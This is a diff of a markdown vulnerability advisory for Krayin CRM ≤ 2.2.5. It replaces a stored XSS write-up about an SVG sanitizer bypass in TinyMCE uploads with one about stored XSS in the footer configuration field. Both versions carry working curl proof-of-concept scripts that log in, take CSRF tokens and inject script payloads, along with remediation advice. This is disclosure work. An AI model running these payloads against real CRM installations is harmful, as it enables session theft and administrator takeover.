@@ -1,482 +1,260 @@
-\# Stored XSS via SVG Sanitizer Bypass in TinyMCE Media Upload (Krayin CRM ≤ 2.2.5)
+# Presentation
 
+**Security Vulnerability:** Stored Cross-Site Scripting (Stored XSS) via Footer Configuration (TinyMCE Sanitization Bypass)
 
+| Field                  | Value                                                                 |
+| ---------------------- | --------------------------------------------------------------------- |
+| **Vulnerability Type** | Cross-Site Scripting (Stored XSS)                                     |
+| **CWE**                | CWE-79 (Primary), CWE-602 (Root Cause), CWE-116 (Contributing)        |
+| **CVE**                | Pending                                                               |
+| **Affected Component** | Configuration Management (ConfigurationController / General Settings) |
+| **Affected Parameter** | `general.settings.footer.label`                                       |
+| **Software**           | Krayin CRM                                                            |
+| **Affected Versions**  | ≤ 2.2.5                                                               |
+| **Business Area**      | Customer Relationship Management (CRM)                                |
+| **Submitter**          | bl4dsc4n                                                              |
 
-\## CVE Description
+---
 
+# Executive Summary
 
+A **Stored Cross-Site Scripting (Stored XSS)** vulnerability exists in **Krayin CRM ≤ 2.2.5** within the global footer configuration feature.
 
-A stored cross-site scripting (XSS) vulnerability in the TinyMCE media upload functionality of Krayin CRM through 2.2.5 allows an authenticated user with TinyMCE upload permissions to bypass SVG sanitization and upload a malicious SVG file containing JavaScript. The vulnerability occurs because SVG detection relies on the client-controlled filename extension instead of the actual file content, allowing an attacker to upload SVG content using a non-SVG filename. The uploaded file is stored as an SVG on the public storage disk and served as `image/svg+xml`, resulting in JavaScript execution in the application origin.
-
-
-
-\## Summary
-
-
-
-Krayin implements SVG sanitization for TinyMCE uploads through the `Sanitizer` trait. However, the decision to apply sanitization is based on the client-supplied filename extension rather than trusted file content.
-
-
-
-An attacker can upload an SVG payload named with a non-SVG extension, such as `evil.png`. The `isSvgFile()` validation returns false because it checks the user-controlled extension, causing the sanitizer to be skipped. The upload process later determines the file extension from the actual content and stores the file as an `.svg` file.
-
-
-
-The resulting file is stored under the public storage directory:
-
-
+The application allows authenticated users with permission to modify system configuration to store arbitrary HTML content inside the configuration parameter:
 
 ```
-
-/storage/tinymce/<hash>.svg
-
+general.settings.footer.label
 ```
 
+Although the web interface attempts to sanitize HTML using TinyMCE's client-side filtering, this protection is performed exclusively in the browser and can be completely bypassed by sending a direct HTTP request to the backend.
 
+The stored content is later rendered using Laravel Blade's unescaped output (`{!! !!}`), resulting in persistent JavaScript execution whenever an administrator or another authenticated user loads any administrative page displaying the global footer.
 
-and served with:
+---
 
+# Vulnerability Details
 
+## Vulnerability Type
 
-```
+Stored Cross-Site Scripting (Stored XSS)
 
-Content-Type: image/svg+xml
-
-```
-
-
-
-Opening the URL executes the embedded JavaScript in the CRM origin.
-
-
-
-This vulnerability represents a bypass of the SVG sanitizer protection and remains present in the TinyMCE upload path, independent from other upload-related fixes introduced in version 2.2.5.
-
-
-
-\## Severity
-
-
-
-\*\*High\*\*
-
-
-
-\*\*CVSS v3.1:\*\* `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (\*\*8.7\*\*)
-
-
-
-Stored XSS reachable by authenticated users with TinyMCE upload access. The stored payload is additionally accessible without authentication through the public `/storage` path.
-
-
-
-\## Affected Versions
-
-
-
-Confirmed on:
-
-
-
-\- Krayin CRM 2.2.4
-
-\- Krayin CRM 2.2.5
-
-
-
-The vulnerable `TinyMCEController` implementation and `Sanitizer` trait behavior are identical across both versions.
-
-
-
-\## Affected Component
-
-
-
-\*\*Controller\*\*
-
-
+## Affected Endpoint
 
 ```
-
-Webkul\\Admin\\Http\\Controllers\\TinyMCEController
-
+POST /admin/configuration/general/settings
 ```
 
-
-
-Methods:
-
-
+## Affected Parameter
 
 ```
-
-upload()
-
-storeMedia()
-
+general[settings][footer][label]
 ```
 
+---
 
+# Impact
 
-\*\*Trait\*\*
+An authenticated attacker with permission to modify system configuration can permanently inject malicious JavaScript into the global footer.
 
+Because the footer is rendered across the administration interface, the payload executes automatically whenever another authenticated administrator or privileged user visits any affected page.
 
+Successful exploitation may allow an attacker to:
 
+* Execute arbitrary JavaScript in another administrator's browser.
+* Steal session cookies (when not protected by HttpOnly).
+* Capture CSRF tokens.
+* Perform authenticated actions on behalf of the victim.
+* Modify application configuration.
+* Create or modify privileged accounts.
+* Facilitate privilege escalation in environments with multiple administrators.
+
+---
+
+# Root Cause Analysis
+
+The vulnerability is caused by a combination of insecure design decisions:
+
+1. The backend performs **no server-side HTML sanitization** before storing the configuration value.
+
+2. The stored value is rendered using Laravel Blade's unescaped rendering syntax:
+
+```blade
+{!! core()->getConfigData('general.settings.footer.label') !!}
 ```
 
-Webkul\\Core\\Traits\\Sanitizer
+3. The application relies exclusively on TinyMCE client-side filtering.
 
+Client-side validation is not a security boundary because attackers can communicate directly with the HTTP endpoint and completely bypass browser-side restrictions.
+
+---
+
+# Attack Scenario
+
+An authenticated administrator submits a direct HTTP POST request to the configuration endpoint containing malicious HTML instead of using the TinyMCE editor.
+
+The payload is stored without sanitization.
+
+Every administrator subsequently viewing the administration panel automatically executes the injected JavaScript in their browser.
+
+---
+
+# Proof of Concept
+
+## Malicious Payload
+
+```html
+<img src=x onerror=alert(document.domain)>
 ```
 
-
-
-Methods:
-
-
-
-```
-
-isSvgFile()
-
-sanitizeSvg()
-
-```
-
-
-
-\*\*Endpoint\*\*
-
-
-
-```
-
-POST /admin/tinymce/upload
-
-```
-
-
-
-\---
-
-
-
-\## Technical Description
-
-
-
-The upload routine stores the file using the server-detected extension:
-
-
-
-```php
-
-$extension = $file->extension();
-
-
-
-$filename = md5($file->getClientOriginalName().time()).'.'.$extension;
-
-
-
-$path = $file->storeAs(
-
-&#x20;   $this->storagePath,
-
-&#x20;   $filename
-
-);
-
-```
-
-
-
-However, SVG detection relies on the client-controlled filename:
-
-
-
-```php
-
-public function isSvgFile(UploadedFile $file): bool
-
-{
-
-&#x20;   return str\_contains(
-
-&#x20;       strtolower($file->getClientOriginalExtension()),
-
-&#x20;       'svg'
-
-&#x20;   );
-
-}
-
-```
-
-
-
-An attacker can upload SVG content using a filename such as:
-
-
-
-```
-
-evil.png
-
-```
-
-
-
-The sanitizer check evaluates:
-
-
-
-```
-
-client extension = png
-
-```
-
-
-
-and skips sanitization.
-
-
-
-The application later detects the real content type:
-
-
-
-```
-
-extension = svg
-
-```
-
-
-
-and stores:
-
-
-
-```
-
-<md5>.svg
-
-```
-
-
-
-The malicious SVG is then served as:
-
-
-
-```
-
-Content-Type: image/svg+xml
-
-```
-
-
-
-allowing embedded JavaScript execution.
-
-
-
-\---
-
-
-
-\## Proof of Concept
-
-
-
-Authenticate as a user with TinyMCE upload access:
-
-
+## Authentication
 
 ```bash
+BASE="http://172.25.44.135:8084"
+JAR="$(mktemp)"
 
-BASE=https://TARGET
+tok(){
+    grep -oP 'name="_token"\s+value="\K[^"]+' <<<"$1" | head -1
+}
 
-CJ=$(mktemp)
+T1=$(tok "$(curl -s -c "$JAR" "$BASE/admin/login")")
 
-
-
-LT=$(curl -s -c "$CJ" "$BASE/admin/login" \\
-
-&#x20;| grep -oE 'name="\_token" value="\[^"]+"' \\
-
-&#x20;| sed -E 's/.\*value="(\[^"]+)".\*/\\1/')
-
-
-
-curl -s -b "$CJ" -c "$CJ" \\
-
-&#x20; -o /dev/null \\
-
-&#x20; -X POST "$BASE/admin/login" \\
-
-&#x20; --data-urlencode "\_token=$LT" \\
-
-&#x20; --data-urlencode "email=admin@example.com" \\
-
-&#x20; --data-urlencode "password=admin123"
-
-
-
-XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\\s+(\\S+)',open('$CJ').read()).group(1)))")
-
-
-
-printf '%s' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.png
-
-
-
-curl -s -b "$CJ" \\
-
-&#x20; -X POST "$BASE/admin/tinymce/upload" \\
-
-&#x20; -H "X-XSRF-TOKEN: $XSRF" \\
-
-&#x20; -H "Accept: application/json" \\
-
-&#x20; -F "file=@evil.png;type=image/svg+xml"
-
+curl -s \
+    -b "$JAR" \
+    -c "$JAR" \
+    -L \
+    --data-urlencode "email=admin@example.com" \
+    --data-urlencode "password=admin123" \
+    --data-urlencode "_token=$T1" \
+    "$BASE/admin/login"
 ```
 
+## Stored XSS Injection
 
+```bash
+T2=$(tok "$(curl -s -b "$JAR" -c "$JAR" \
+"$BASE/admin/configuration/general/settings")")
 
-\### Observed Result
-
-
-
-The server returns a location similar to:
-
-
-
+curl -s \
+    -b "$JAR" \
+    -c "$JAR" \
+    -L \
+    --data-urlencode "_token=$T2" \
+    --data-urlencode 'general[settings][footer][label]=<img src=x onerror=alert(document.domain)>' \
+    "$BASE/admin/configuration/general/settings"
 ```
 
-/storage/tinymce/<hash>.svg
+---
+
+# Reproduction Steps
+
+1. Authenticate as an administrator.
+2. Obtain a valid CSRF token.
+3. Send a direct POST request to:
 
 ```
-
-
-
-Accessing the URL returns:
-
-
-
+POST /admin/configuration/general/settings
 ```
 
-HTTP/200 OK
-
-Content-Type: image/svg+xml
+4. Set the parameter:
 
 ```
-
-
-
-The SVG content remains unsanitized and the embedded JavaScript executes in the CRM origin.
-
-
-
-The `/storage` URL does not require authentication.
-
-
-
-\---
-
-
-
-\## Impact
-
-
-
-Successful exploitation allows an authenticated attacker with TinyMCE upload permissions to execute arbitrary JavaScript in the CRM application context.
-
-
-
-Potential impacts include:
-
-
-
-\- Session theft;
-
-\- CSRF token exposure;
-
-\- Performing actions as another user;
-
-\- Administrative account compromise when accessed by privileged users;
-
-\- Persistent malicious content hosted on the application domain.
-
-
-
-\---
-
-
-
-\## Suggested Remediation
-
-
-
-\- Detect SVG files using trusted server-side content inspection instead of client-controlled filenames.
-
-\- Always apply SVG sanitization based on actual file content.
-
-\- Reject uploads when sanitization fails.
-
-\- Avoid storing active content such as SVG files on publicly accessible storage.
-
-\- Serve uploaded files using restrictive headers such as `Content-Disposition` and an appropriate Content Security Policy (CSP).
-
-
-
-\---
-
-
-
-\## Weakness Classification
-
-
-
-\- \*\*Primary:\*\* CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
-
-\- \*\*Root Cause:\*\* CWE-646 — Reliance on File Name or Extension of Externally-Supplied File
-
-\- \*\*Contributing:\*\* CWE-434 — Unrestricted Upload of File with Dangerous Type
-
-\- \*\*Additional:\*\* CWE-693 — Protection Mechanism Failure
-
-
-
-\*\*VulDB Classification\*\*
-
-
-
+general[settings][footer][label]
 ```
 
-Cross Site Scripting
+to:
 
+```html
+<img src=x onerror=alert(document.domain)>
 ```
 
+5. Save the configuration.
+6. Browse to any administration page.
+7. The JavaScript payload executes automatically from the persistent footer.
 
+---
 
-\---
+# Security Impact
 
+**Confidentiality**
 
+* Theft of administrator session information.
+* Disclosure of sensitive application data.
 
-\## Disclosure
+**Integrity**
 
+* Execution of arbitrary actions as another administrator.
+* Unauthorized modification of application settings.
 
+**Availability**
 
-Reported privately under coordinated vulnerability disclosure.
+* Limited impact.
+* JavaScript payloads may interfere with normal administration workflows.
 
+---
 
+# Root Cause
 
-Proof-of-concept, reproduction steps, and affected version evidence are available upon request.
+* Missing server-side sanitization.
+* Reliance on client-side TinyMCE filtering.
+* Unsafe rendering using unescaped Blade directives (`{!! !!}`).
 
+---
 
+# Suggested Remediation
 
-Please credit the reporter and request a CVE identifier if applicable.
+* Perform HTML sanitization on the server before storing rich-text configuration fields.
+* Replace unescaped Blade rendering with escaped output whenever HTML rendering is unnecessary.
+* If HTML support is required, implement an allowlist-based HTML sanitizer such as HTMLPurifier.
+* Validate all configurable rich-text fields on the backend regardless of client-side controls.
+* Consider deploying a strict Content Security Policy (CSP) as an additional defense-in-depth measure.
 
+---
+
+# Suggested CVSS v3.1
+
+**Vector**
+
+```
+CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L
+```
+
+**Base Score**
+
+**6.8 (Medium)**
+
+---
+
+# CWE Mapping
+
+* **CWE-79** — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+* **CWE-602** — Client-Side Enforcement of Server-Side Security
+* **CWE-116** — Improper Encoding or Escaping of Output
+
+---
+
+# Vendor Response
+
+Pending.
+
+---
+
+# Timeline
+
+| Date       | Event                    |
+| ---------- | ------------------------ |
+| YYYY-MM-DD | Vulnerability discovered |
+| YYYY-MM-DD | Vendor notified          |
+| YYYY-MM-DD | Vendor acknowledged      |
+| YYYY-MM-DD | Patch released           |
+| YYYY-MM-DD | Public disclosure        |
+| YYYY-MM-DD | CVE assigned             |
+
+---
+
+# References
+
+* OWASP Cross-Site Scripting Prevention Cheat Sheet
+* CWE-79
+* CWE-602
+* CWE-116
+* Laravel Blade Documentation
